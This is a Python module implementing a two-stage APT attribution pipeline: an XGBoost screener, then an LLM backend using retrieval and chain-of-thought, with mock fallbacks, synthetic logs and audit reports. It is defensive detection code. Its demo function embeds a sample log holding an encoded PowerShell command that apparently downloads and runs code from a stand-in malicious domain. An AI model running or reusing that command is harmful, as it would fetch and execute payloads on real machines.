"""
CAAAPT Core Pipeline
End-to-end pipeline for APT attribution as described in the paper

Implements the complete two-stage architecture:
1. Frontend: XGBoost-based lightweight screener (high-recall)
2. Backend: RAG + CoT based LLM attribution engine

The pipeline processes:
- Raw log input -> Frontend screening -> Backend attribution -> Output

As described in Algorithm 1 and Algorithm 2, Section 3

Sanitized version for submission - No sensitive paths, API keys, or internal IPs
"""

import os
import sys
import json
import time
import hashlib
from typing import List, Dict, Any, Optional, Tuple, Union
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
import numpy as np

# Import internal modules
try:
    from frontend.compress import SemanticCompressor
    from frontend.feature_extractor import FeatureExtractor
    from frontend.xgboost_screener import XGBoostScreener
except ImportError:
    # Provide mock implementations for testing
    SemanticCompressor = None
    FeatureExtractor = None
    XGBoostScreener = None

try:
    from backend.retriever import HybridRetriever
    from backend.cot_prompts import CoTPromptTemplates
    from backend.llm_client import LLMClient, APTAttributionLLM
    from backend.attributed_analyzer import AttributedAnalyzer, AttributedResult
except ImportError:
    HybridRetriever = None
    CoTPromptTemplates = None
    LLMClient = None
    APTAttributionLLM = None
    AttributedAnalyzer = None
    AttributedResult = None

from core.confidence import ConfidenceCalculator
from core.human_review import HumanReviewHandler


class ProcessingStatus(Enum):
    """Pipeline processing status"""
    PENDING = "pending"
    FRONTEND_PROCESSING = "frontend_processing"
    FRONTEND_COMPLETED = "frontend_completed"
    FRONTEND_REJECTED = "frontend_rejected"
    BACKEND_PROCESSING = "backend_processing"
    BACKEND_COMPLETED = "backend_completed"
    MANUAL_REVIEW = "manual_review"
    COMPLETED = "completed"
    ERROR = "error"


@dataclass
class PipelineConfig:
    """
    Pipeline configuration

    Configures both frontend and backend components
    """
    # Frontend configuration
    tau_front: float = 0.70  # Frontend threshold (Equation 1)
    xgboost_params: Optional[Dict] = None
    feature_params: Optional[Dict] = None

    # Backend configuration
    tau_back: float = 0.75  # Backend threshold (Equation 4)
    rag_alpha: float = 0.6  # Hybrid retrieval weight (Equation 6)
    cot_temperature: float = 0.1

    # Pipeline behavior
    enable_frontend: bool = True
    enable_rag: bool = True
    enable_cot: bool = True
    enable_human_review: bool = True
    use_cache: bool = True

    # Performance
    batch_size: int = 100
    max_parallel: int = 4

    # Paths
    knowledge_base_path: str = "data/knowledge_base"
    model_cache_path: str = "cache/models"

    def to_dict(self) -> Dict:
        return {
            "tau_front": self.tau_front,
            "tau_back": self.tau_back,
            "rag_alpha": self.rag_alpha,
            "cot_temperature": self.cot_temperature,
            "enable_frontend": self.enable_frontend,
            "enable_rag": self.enable_rag,
            "enable_cot": self.enable_cot,
            "enable_human_review": self.enable_human_review
        }


@dataclass
class PipelineResult:
    """
    Complete pipeline result for a single sample
    """
    sample_id: str
    status: ProcessingStatus
    frontend_score: Optional[float]
    frontend_passed: bool
    backend_result: Optional[Any]  # AttributedResult
    final_confidence: float
    final_decision: str
    latency_ms: float
    retrieval_context: Optional[Dict]
    error_message: Optional[str] = None

    def to_dict(self) -> Dict:
        result = {
            "sample_id": self.sample_id,
            "status": self.status.value,
            "frontend_score": self.frontend_score,
            "frontend_passed": self.frontend_passed,
            "final_confidence": self.final_confidence,
            "final_decision": self.final_decision,
            "latency_ms": self.latency_ms
        }

        if self.backend_result:
            if hasattr(self.backend_result, 'to_dict'):
                result["backend"] = self.backend_result.to_dict()
            elif hasattr(self.backend_result, 'report'):
                result["backend"] = self.backend_result.report

        if self.error_message:
            result["error"] = self.error_message

        return result

    def to_auditable_report(self) -> str:
        """Generate human-readable auditable report"""
        lines = [
            "=" * 80,
            f"CAAAPT Pipeline Report - {self.sample_id}",
            "=" * 80,
            f"Status: {self.status.value}",
            f"Final Decision: {self.final_decision}",
            f"Final Confidence: {self.final_confidence:.4f}",
            f"Latency: {self.latency_ms:.2f} ms",
            "-" * 40,
            f"Frontend Passed: {self.frontend_passed}",
            f"Frontend Score: {self.frontend_score:.4f}" if self.frontend_score else "Frontend Score: N/A",
        ]

        if self.backend_result and hasattr(self.backend_result, 'to_auditable_trace'):
            lines.append("\n" + self.backend_result.to_auditable_trace())

        lines.append("=" * 80)
        return "\n".join(lines)


class CAAAPTPipeline:
    """
    Complete CAAAPT pipeline orchestrating frontend and backend

    Implements the two-stage architecture:
    Stage 1: XGBoost screening (Equation 1)
    Stage 2: LLM attribution (Equation 4)

    Algorithm 1 (Frontend filtering) and Algorithm 2 (Backend attribution)
    are implemented in their respective modules. This pipeline orchestrates
    the end-to-end flow.
    """

    def __init__(self, config: Optional[PipelineConfig] = None):
        """
        Initialize the CAAAPT pipeline

        Args:
            config: Pipeline configuration (uses defaults if None)
        """
        self.config = config or PipelineConfig()

        # Initialize components (lazy loading)
        self._frontend_screener = None
        self._feature_extractor = None
        self._compressor = None
        self._backend_analyzer = None
        self._confidence_calculator = None
        self._human_review_handler = None

        # Statistics and cache
        self._stats = {
            "total_processed": 0,
            "frontend_passed": 0,
            "backend_processed": 0,
            "accepted": 0,
            "manual_review": 0,
            "rejected": 0,
            "total_latency_ms": 0.0
        }
        self._cache: Dict[str, PipelineResult] = {}

        # Initialize components
        self._init_components()

        print(f"[INFO] CAAAPT Pipeline initialized with config: {self.config.to_dict()}")

    def _init_components(self):
        """Initialize pipeline components"""
        # Initialize frontend components
        if self.config.enable_frontend:
            self._init_frontend()

        # Initialize backend components
        self._init_backend()

        # Initialize confidence calculator
        self._confidence_calculator = ConfidenceCalculator(
            a_d=0.25, a_r=0.25, a_a=0.25, a_k=0.25
        )

        # Initialize human review handler
        if self.config.enable_human_review:
            self._human_review_handler = HumanReviewHandler()

    def _init_frontend(self):
        """Initialize frontend screener components"""
        try:
            if XGBoostScreener is not None:
                self._frontend_screener = XGBoostScreener(
                    params=self.config.xgboost_params,
                    threshold=self.config.tau_front
                )
                print("[INFO] Frontend screener initialized")
            else:
                print("[WARN] XGBoostScreener not available, using mock")
                self._frontend_screener = self._create_mock_frontend()

            if FeatureExtractor is not None:
                self._feature_extractor = FeatureExtractor(
                    params=self.config.feature_params
                )

            if SemanticCompressor is not None:
                self._compressor = SemanticCompressor()

        except Exception as e:
            print(f"[WARN] Frontend initialization failed: {e}, using mock")
            self._frontend_screener = self._create_mock_frontend()

    def _create_mock_frontend(self):
        """Create mock frontend for testing"""

        class MockFrontend:
            def __init__(self, threshold=0.7):
                self.threshold = threshold

            def predict(self, X):
                # Mock predictions based on input hash
                if hasattr(X, 'shape'):
                    n = X.shape[0]
                else:
                    n = len(X)
                np.random.seed(42)
                scores = np.random.rand(n) * 0.6 + 0.2  # Range 0.2-0.8
                passed = scores >= self.threshold
                return scores, passed

            def get_anomaly_score(self, sample):
                np.random.seed(hash(str(sample)) % 2 ** 32)
                return 0.3 + np.random.rand() * 0.5

        return MockFrontend(threshold=self.config.tau_front)

    def _init_backend(self):
        """Initialize backend analyzer"""
        try:
            if AttributedAnalyzer is not None:
                self._backend_analyzer = AttributedAnalyzer(
                    tau_back=self.config.tau_back,
                    knowledge_base_path=self.config.knowledge_base_path,
                    use_cache=self.config.use_cache
                )
                print("[INFO] Backend analyzer initialized")
            else:
                print("[WARN] AttributedAnalyzer not available, using mock")
                self._backend_analyzer = self._create_mock_backend()

        except Exception as e:
            print(f"[WARN] Backend initialization failed: {e}, using mock")
            self._backend_analyzer = self._create_mock_backend()

    def _create_mock_backend(self):
        """Create mock backend for testing"""

        class MockBackend:
            def __init__(self, tau_back=0.75):
                self.tau_back = tau_back

            def analyze(self, event_sequence, xgboost_score, sample_id=None):
                # Generate mock result
                confidence = 0.5 + np.random.rand() * 0.4
                decision = "accept" if confidence >= self.tau_back else "manual_review"

                class MockResult:
                    def __init__(self, c, d, sid):
                        self.final_confidence = c
                        self.decision = d
                        self.sample_id = sid
                        self.report = {"mock": True, "confidence": c}

                    def to_auditable_trace(self):
                        return f"Mock trace for {self.sample_id}"

                return MockResult(confidence, decision, sample_id)

        return MockBackend(tau_back=self.config.tau_back)

    def _get_cache_key(self, log_data: Dict) -> str:
        """Generate cache key for log data"""
        data_str = json.dumps(log_data, sort_keys=True)
        return hashlib.md5(data_str.encode()).hexdigest()

    def _preprocess_log(self, raw_log: Union[str, Dict, List]) -> Dict:
        """
        Preprocess raw log into standardized format

        As described in Section 3.1.1: Data compression with semantic preservation
        """
        if isinstance(raw_log, str):
            # Parse string log
            try:
                return json.loads(raw_log)
            except json.JSONDecodeError:
                return {"raw": raw_log, "timestamp": datetime.now().isoformat()}

        if isinstance(raw_log, list):
            # List of events
            return {"events": raw_log, "timestamp": datetime.now().isoformat()}

        return raw_log

    def process_single(self,
                       log_data: Union[str, Dict, List],
                       sample_id: Optional[str] = None,
                       force_backend: bool = False) -> PipelineResult:
        """
        Process a single log sample through the pipeline

        Args:
            log_data: Raw log data to analyze
            sample_id: Optional identifier
            force_backend: Force backend processing even if frontend rejects

        Returns:
            PipelineResult containing analysis outcome
        """
        start_time = time.time()

        # Generate sample ID
        if sample_id is None:
            sample_id = hashlib.md5(str(log_data).encode()).hexdigest()[:16]

        # Check cache
        cache_key = self._get_cache_key(self._preprocess_log(log_data))
        if self.config.use_cache and cache_key in self._cache:
            return self._cache[cache_key]

        # Preprocess log
        processed_log = self._preprocess_log(log_data)

        # Stage 1: Frontend screening (Algorithm 1)
        frontend_score = None
        frontend_passed = False

        if self.config.enable_frontend and not force_backend:
            try:
                frontend_score, frontend_passed = self._run_frontend(processed_log)

                if not frontend_passed:
                    # Sample rejected by frontend (benign)
                    result = PipelineResult(
                        sample_id=sample_id,
                        status=ProcessingStatus.FRONTEND_REJECTED,
                        frontend_score=frontend_score,
                        frontend_passed=False,
                        backend_result=None,
                        final_confidence=frontend_score if frontend_score else 0.0,
                        final_decision="reject",
                        latency_ms=(time.time() - start_time) * 1000,
                        retrieval_context=None
                    )

                    if self.config.use_cache:
                        self._cache[cache_key] = result

                    self._update_stats(result)
                    return result

            except Exception as e:
                print(f"[ERROR] Frontend processing failed: {e}")
                # Fall through to backend if frontend fails

        # Stage 2: Backend attribution (Algorithm 2)
        try:
            backend_result = self._run_backend(processed_log, frontend_score or 0.5)

            final_confidence = backend_result.final_confidence
            final_decision = backend_result.decision.value if hasattr(backend_result.decision, 'value') else str(
                backend_result.decision)

            status = ProcessingStatus.BACKEND_COMPLETED
            if final_decision == "manual_review":
                status = ProcessingStatus.MANUAL_REVIEW
            elif final_decision == "accept":
                status = ProcessingStatus.COMPLETED

            result = PipelineResult(
                sample_id=sample_id,
                status=status,
                frontend_score=frontend_score,
                frontend_passed=frontend_passed or force_backend,
                backend_result=backend_result,
                final_confidence=final_confidence,
                final_decision=final_decision,
                latency_ms=(time.time() - start_time) * 1000,
                retrieval_context=getattr(backend_result, 'retrieval_context', None)
            )

        except Exception as e:
            result = PipelineResult(
                sample_id=sample_id,
                status=ProcessingStatus.ERROR,
                frontend_score=frontend_score,
                frontend_passed=frontend_passed,
                backend_result=None,
                final_confidence=0.0,
                final_decision="error",
                latency_ms=(time.time() - start_time) * 1000,
                retrieval_context=None,
                error_message=str(e)
            )

        # Cache result
        if self.config.use_cache:
            self._cache[cache_key] = result

        # Update statistics
        self._update_stats(result)

        return result

    def _run_frontend(self, processed_log: Dict) -> Tuple[float, bool]:
        """
        Run frontend screening (XGBoost)

        As described in Equation (1):
        F_front(x) = I(P_xgb(y=1|x) >= tau_front)
        """
        try:
            if hasattr(self._frontend_screener, 'get_anomaly_score'):
                score = self._frontend_screener.get_anomaly_score(processed_log)
            else:
                # Mock implementation
                score = 0.3 + np.random.rand() * 0.5

            passed = score >= self.config.tau_front
            return float(score), passed

        except Exception as e:
            print(f"[ERROR] Frontend scoring failed: {e}")
            return 0.5, True  # Default to pass on error

    def _run_backend(self, processed_log: Dict, frontend_score: float) -> Any:
        """
        Run backend attribution (RAG + CoT LLM)

        As described in Equation (4):
        F_back(z) = {(C_final, R_report) | C_final >= tau_back}
        """
        if hasattr(self._backend_analyzer, 'analyze'):
            return self._backend_analyzer.analyze(
                event_sequence=processed_log,
                xgboost_score=frontend_score
            )
        else:
            # Mock implementation
            class MockResult:
                def __init__(self):
                    self.final_confidence = 0.85
                    self.decision = "accept"
                    self.report = {"analysis": "Mock attribution result"}
                    self.retrieval_context = {}

            return MockResult()

    def _update_stats(self, result: PipelineResult):
        """Update pipeline statistics"""
        self._stats["total_processed"] += 1
        self._stats["total_latency_ms"] += result.latency_ms

        if result.frontend_passed:
            self._stats["frontend_passed"] += 1

        if result.backend_result is not None:
            self._stats["backend_processed"] += 1

        if result.final_decision == "accept":
            self._stats["accepted"] += 1
        elif result.final_decision == "manual_review":
            self._stats["manual_review"] += 1
        elif result.final_decision == "reject":
            self._stats["rejected"] += 1

    def process_batch(self,
                      logs: List[Union[str, Dict, List]],
                      sample_ids: Optional[List[str]] = None) -> List[PipelineResult]:
        """
        Process a batch of logs through the pipeline

        Args:
            logs: List of log samples
            sample_ids: Optional list of sample IDs

        Returns:
            List of PipelineResult objects
        """
        results = []

        for i, log in enumerate(logs):
            sample_id = sample_ids[i] if sample_ids and i < len(sample_ids) else None
            result = self.process_single(log, sample_id)
            results.append(result)

            # Progress reporting for large batches
            if (i + 1) % self.config.batch_size == 0:
                print(f"[INFO] Processed {i + 1}/{len(logs)} samples")

        return results

    def get_statistics(self) -> Dict[str, Any]:
        """Get pipeline statistics"""
        avg_latency = self._stats["total_latency_ms"] / self._stats["total_processed"] if self._stats[
                                                                                              "total_processed"] > 0 else 0

        return {
            **self._stats,
            "average_latency_ms": avg_latency,
            "frontend_pass_rate": self._stats["frontend_passed"] / self._stats["total_processed"] if self._stats[
                                                                                                         "total_processed"] > 0 else 0,
            "acceptance_rate": self._stats["accepted"] / self._stats["total_processed"] if self._stats[
                                                                                               "total_processed"] > 0 else 0,
            "cache_size": len(self._cache),
            "config": self.config.to_dict()
        }

    def get_samples_for_review(self) -> List[PipelineResult]:
        """Get samples that require manual review"""
        return [r for r in self._cache.values() if r.final_decision == "manual_review"]

    def submit_review_decision(self,
                               sample_id: str,
                               decision: str,
                               notes: str) -> bool:
        """
        Submit manual review decision

        Args:
            sample_id: ID of the sample
            decision: 'accept' or 'reject'
            notes: Reviewer notes

        Returns:
            True if successful
        """
        # Find sample in cache
        for key, result in self._cache.items():
            if result.sample_id == sample_id:
                # Update result
                updated_result = PipelineResult(
                    sample_id=result.sample_id,
                    status=ProcessingStatus.COMPLETED if decision == "accept" else ProcessingStatus.FRONTEND_REJECTED,
                    frontend_score=result.frontend_score,
                    frontend_passed=result.frontend_passed,
                    backend_result=result.backend_result,
                    final_confidence=result.final_confidence,
                    final_decision=decision,
                    latency_ms=result.latency_ms,
                    retrieval_context=result.retrieval_context
                )
                self._cache[key] = updated_result

                # Update statistics
                if result.final_decision == "manual_review":
                    self._stats["manual_review"] -= 1
                    if decision == "accept":
                        self._stats["accepted"] += 1
                    else:
                        self._stats["rejected"] += 1

                return True

        return False

    def reset(self):
        """Reset pipeline state"""
        self._stats = {
            "total_processed": 0,
            "frontend_passed": 0,
            "backend_processed": 0,
            "accepted": 0,
            "manual_review": 0,
            "rejected": 0,
            "total_latency_ms": 0.0
        }
        self._cache.clear()

    def save_report(self, output_path: str, results: List[PipelineResult]):
        """Save pipeline results to file"""
        os.makedirs(os.path.dirname(output_path), exist_ok=True)

        report = {
            "timestamp": datetime.now().isoformat(),
            "config": self.config.to_dict(),
            "statistics": self.get_statistics(),
            "results": [r.to_dict() for r in results]
        }

        with open(output_path, 'w') as f:
            json.dump(report, f, indent=2)

        print(f"[INFO] Report saved to {output_path}")

    def generate_audit_log(self, result: PipelineResult) -> str:
        """Generate audit log for compliance"""
        return result.to_auditable_report()


# ================================================================
# Pipeline Factory and Utilities
# ================================================================

def create_pipeline_from_config(config_path: str) -> CAAAPTPipeline:
    """
    Create pipeline from configuration file

    Args:
        config_path: Path to JSON/YAML configuration file

    Returns:
        Configured CAAAPTPipeline instance
    """
    with open(config_path, 'r') as f:
        if config_path.endswith('.json'):
            config_dict = json.load(f)
        else:
            try:
                import yaml
                config_dict = yaml.safe_load(f)
            except ImportError:
                raise ImportError("PyYAML required for YAML config files")

    pipeline_config = PipelineConfig(
        tau_front=config_dict.get("tau_front", 0.70),
        tau_back=config_dict.get("tau_back", 0.75),
        rag_alpha=config_dict.get("rag_alpha", 0.6),
        enable_frontend=config_dict.get("enable_frontend", True),
        enable_rag=config_dict.get("enable_rag", True),
        enable_cot=config_dict.get("enable_cot", True),
        enable_human_review=config_dict.get("enable_human_review", True),
        use_cache=config_dict.get("use_cache", True),
        batch_size=config_dict.get("batch_size", 100)
    )

    return CAAAPTPipeline(pipeline_config)


def load_test_logs(log_path: str) -> List[Dict]:
    """Load test logs from file"""
    if not os.path.exists(log_path):
        # Generate synthetic test logs
        return generate_synthetic_logs(100)

    with open(log_path, 'r') as f:
        if log_path.endswith('.json'):
            data = json.load(f)
            if isinstance(data, list):
                return data
            elif isinstance(data, dict) and 'logs' in data:
                return data['logs']

    return generate_synthetic_logs(100)


def generate_synthetic_logs(n_samples: int = 100) -> List[Dict]:
    """Generate synthetic log data for testing"""
    logs = []

    for i in range(n_samples):
        log = {
            "timestamp": datetime.now().isoformat(),
            "event_id": f"evt_{i:06d}",
            "event_type": np.random.choice(["process_create", "file_write", "network_connect", "registry_modify"]),
            "source": f"pid_{np.random.randint(1000, 9999)}",
            "target": f"pid_{np.random.randint(1000, 9999)}" if np.random.rand() > 0.5 else f"file_{i}",
            "attributes": {
                "command_line": f"process_{i}.exe" if np.random.rand() > 0.9 else "normal_operation.exe",
                "user": "SYSTEM" if np.random.rand() > 0.8 else "user_001"
            }
        }
        logs.append(log)

    return logs


# ================================================================
# Main Entry Point and Testing
# ================================================================

def test_pipeline():
    """Test the CAAAPT pipeline"""
    print("=" * 60)
    print("Testing CAAAPT Pipeline")
    print("=" * 60)

    # Create pipeline with test configuration
    config = PipelineConfig(
        tau_front=0.70,
        tau_back=0.75,
        enable_frontend=True,
        enable_human_review=True,
        use_cache=True
    )

    pipeline = CAAAPTPipeline(config)

    # Generate test logs
    test_logs = generate_synthetic_logs(20)

    print(f"\n[TEST] Processing {len(test_logs)} synthetic logs...")

    # Process batch
    results = pipeline.process_batch(test_logs)

    # Display results
    print("\n[RESULTS]")
    print(f"  Total processed: {len(results)}")
    print(f"  Frontend passed: {sum(1 for r in results if r.frontend_passed)}")
    print(f"  Accepted: {sum(1 for r in results if r.final_decision == 'accept')}")
    print(f"  Manual review: {sum(1 for r in results if r.final_decision == 'manual_review')}")
    print(f"  Rejected: {sum(1 for r in results if r.final_decision == 'reject')}")

    avg_latency = sum(r.latency_ms for r in results) / len(results)
    print(f"  Average latency: {avg_latency:.2f} ms")

    # Display statistics
    stats = pipeline.get_statistics()
    print(f"\n[STATISTICS]")
    print(json.dumps(stats, indent=2))

    # Show sample audit report
    if results:
        print("\n[SAMPLE AUDIT REPORT]")
        print(results[0].to_auditable_report())

    print("\n[INFO] Pipeline test completed")


def demo_end_to_end():
    """End-to-end demonstration of the pipeline"""
    print("=" * 60)
    print("CAAAPT End-to-End Demonstration")
    print("=" * 60)

    # Create pipeline
    pipeline = CAAAPTPipeline()

    # Simulated suspicious log (malicious PowerShell)
    suspicious_log = {
        "timestamp": "2025-01-15T10:23:45",
        "event_type": "process_create",
        "source": "cmd.exe (PID 1234)",
        "target": "powershell.exe (PID 5678)",
        "attributes": {
            "command_line": "powershell.exe -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAG0AYAbABpAGMAaQBvAHUAcwAtAGQAbwBtAGEAaQBuAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAJwApADsAIABJAGUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAtAGQAbwBtAGEAaQBuAC4AYwBvAG0ALwBwAGEAdwBuAC4AZQB4AGUAJwApAA==",
            "user": "SYSTEM"
        }
    }

    print("\n[INPUT] Suspicious log detected:")
    print(f"  Type: {suspicious_log['event_type']}")
    print(f"  Source: {suspicious_log['source']}")
    print(f"  Target: {suspicious_log['target']}")
    print(f"  Command: {suspicious_log['attributes']['command_line'][:80]}...")

    # Process through pipeline
    print("\n[PROCESSING] Running through CAAAPT pipeline...")
    result = pipeline.process_single(suspicious_log, sample_id="demo_001")

    # Display results
    print(f"\n[RESULT]")
    print(f"  Frontend Score: {result.frontend_score:.4f}")
    print(f"  Frontend Passed: {result.frontend_passed}")
    print(f"  Final Confidence: {result.final_confidence:.4f}")
    print(f"  Final Decision: {result.final_decision}")
    print(f"  Latency: {result.latency_ms:.2f} ms")

    # Show full audit report
    print("\n[AUDIT REPORT]")
    print(result.to_auditable_report())

    # Show statistics
    stats = pipeline.get_statistics()
    print(f"\n[PIPELINE STATISTICS]")
    print(f"  Total processed: {stats['total_processed']}")
    print(f"  Acceptance rate: {stats['acceptance_rate']:.2%}")
    print(f"  Frontend pass rate: {stats['frontend_pass_rate']:.2%}")

    print("\n[INFO] Demo completed")


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="CAAAPT Core Pipeline")
    parser.add_argument("--test", action="store_true", help="Run pipeline tests")
    parser.add_argument("--demo", action="store_true", help="Run end-to-end demo")
    parser.add_argument("--config", type=str, default=None, help="Path to config file")

    args = parser.parse_args()

    if args.demo:
        demo_end_to_end()
    elif args.test:
        test_pipeline()
    else:
        print("CAAAPT Core Pipeline")
        print("Run with --test to test, --demo for end-to-end demonstration")